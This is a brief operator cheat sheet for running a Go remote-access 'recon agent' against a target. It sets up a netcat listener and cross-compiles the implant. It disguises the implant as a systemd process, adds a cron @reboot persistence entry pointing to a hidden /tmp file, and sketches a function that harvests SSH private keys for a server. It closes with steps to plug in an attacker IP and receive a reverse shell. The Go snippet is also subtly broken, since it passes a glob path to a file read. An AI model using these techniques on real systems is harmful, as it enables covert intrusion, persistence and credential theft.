# Attack Machine

`pkg install golang`

`nc -lvnp 4444`


**Compile Agent**

# Cross-compile for different architectures
`GOOS=linux GOARCH=amd64 go build -o agent_x64 recon_agent.go`
`GOOS=linux GOARCH=arm64 go build -o agent_arm recon_agent.go`

# Or compile directly on target
`go build -o system_monitor recon_agent.go`


# Stealth Execution Methods 
**Process Masquerading**
# Rename to look like system process
`mv system_monitor /usr/bin/systemd-network`
`nohup /usr/bin/systemd-network >/dev/null 2>&1 &`



**Cron Persistence**
```
(crontab -l 2>/dev/null; echo "@reboot sleep 60 && /tmp/.systemd-helper") | crontab -
```

**SSH Authorized Keys**
```go
// Add this function to also harvest SSH keys
func backupSSHKeys() {
    data, _ := os.ReadFile("/home/*/.ssh/id_rsa")
    // Send to your server
}
```


1. Replace YOUR_ATTACKER_IP with your machine's IP
2. Compile for target architecture
3. Execute on target VM
4. Connect from your listener
5. You'll receive system recon data followed by shell access
   
